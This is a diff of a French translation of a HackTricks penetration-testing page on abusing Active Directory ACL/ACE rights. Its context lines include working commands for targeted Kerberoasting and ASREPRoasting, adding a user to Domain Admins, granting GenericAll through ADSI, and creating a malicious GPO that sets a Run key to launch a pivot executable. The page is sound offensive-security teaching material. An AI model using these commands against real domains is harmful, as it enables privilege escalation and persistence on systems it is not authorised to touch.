@@ -1,10 +1,11 @@
-# Abus des ACL/ACE Active Directory
+# Abus des ACL/ACE d'Active Directory
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 **Cette page est principalement un résumé des techniques de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**
 
 ## BadSuccessor
+
 
 {{#ref}}
 BadSuccessor.md
@@ -21,7 +22,7 @@ Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipal
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **ASREPRoasting ciblé** : Désactivez la pré-authentification pour l'utilisateur, rendant son compte vulnérable à l'ASREPRoasting.
+- **Targeted ASREPRoasting** : Désactivez la pré-authentification pour l'utilisateur, rendant son compte vulnérable à l'ASREPRoasting.
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
@@ -40,7 +41,7 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet de :
 
 - **Kerberos Resource-based Constrained Delegation** : Permet de prendre le contrôle d'un objet ordinateur.
-- **Shadow Credentials** : Utilisez cette technique pour usurper l'identité d'un ordinateur ou d'un compte utilisateur en exploitant les privilèges pour créer des identifiants fantômes.
+- **Shadow Credentials** : Utilisez cette technique pour usurper un compte ordinateur ou utilisateur en exploitant les privilèges pour créer des identifiants fantômes.
 
 ## **WriteProperty on Group**
 
@@ -50,7 +51,7 @@ Si un utilisateur a des droits `WriteProperty` sur tous les objets pour un group
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **Auto (Auto-Appartenance) dans le Groupe**
+## **Auto (Auto-Membership) dans le Groupe**
 
 Ce privilège permet aux attaquants de s'ajouter à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l'appartenance au groupe. L'utilisation de la séquence de commandes suivante permet l'auto-ajout :
 ```bash
@@ -102,7 +103,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Posséder un objet AD et avoir des privilèges `WriteDACL` sur celui-ci permet à un attaquant de se donner des privilèges `GenericAll` sur l'objet. Cela est accompli par la manipulation d'ADSI, permettant un contrôle total sur l'objet et la capacité de modifier ses appartenances de groupe. Malgré cela, des limitations existent lors de la tentative d'exploiter ces privilèges en utilisant les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
+Posséder un objet AD et avoir des privilèges `WriteDACL` sur celui-ci permet à un attaquant de se donner des privilèges `GenericAll` sur l'objet. Cela est accompli par la manipulation ADSI, permettant un contrôle total sur l'objet et la capacité de modifier ses appartenances de groupe. Malgré cela, des limitations existent lors de la tentative d'exploiter ces privilèges en utilisant les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -145,7 +146,7 @@ Le module GroupPolicy, s'il est installé, permet la création et le lien de nou
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - Abus de GPO
+### SharpGPOAbuse - Abuse GPO
 
 SharpGPOAbuse offre une méthode pour abuser des GPO existants en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouveaux GPO. Cet outil nécessite la modification des GPO existants ou l'utilisation des outils RSAT pour en créer de nouveaux avant d'appliquer des modifications :
 ```bash
@@ -163,7 +164,7 @@ La structure de la tâche, comme indiqué dans le fichier de configuration XML g
 
 ### Utilisateurs et groupes
 
-Les GPO permettent également la manipulation des appartenances des utilisateurs et des groupes sur les systèmes cibles. En modifiant directement les fichiers de politique des Utilisateurs et des Groupes, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, tels que le groupe `administrateurs` local. Cela est possible grâce à la délégation des permissions de gestion des GPO, qui permet la modification des fichiers de politique pour inclure de nouveaux utilisateurs ou changer les appartenances aux groupes.
+Les GPO permettent également la manipulation des appartenances des utilisateurs et des groupes sur les systèmes cibles. En modifiant directement les fichiers de politique des Utilisateurs et des Groupes, les attaquants peuvent ajouter des utilisateurs à des groupes privilégiés, tels que le groupe `administrators` local. Cela est possible grâce à la délégation des permissions de gestion des GPO, qui permet la modification des fichiers de politique pour inclure de nouveaux utilisateurs ou changer les appartenances aux groupes.
 
 Le fichier de configuration XML pour les Utilisateurs et les Groupes décrit comment ces changements sont mis en œuvre. En ajoutant des entrées à ce fichier, des utilisateurs spécifiques peuvent se voir accorder des privilèges élevés sur les systèmes affectés. Cette méthode offre une approche directe pour l'élévation des privilèges par la manipulation des GPO.
 
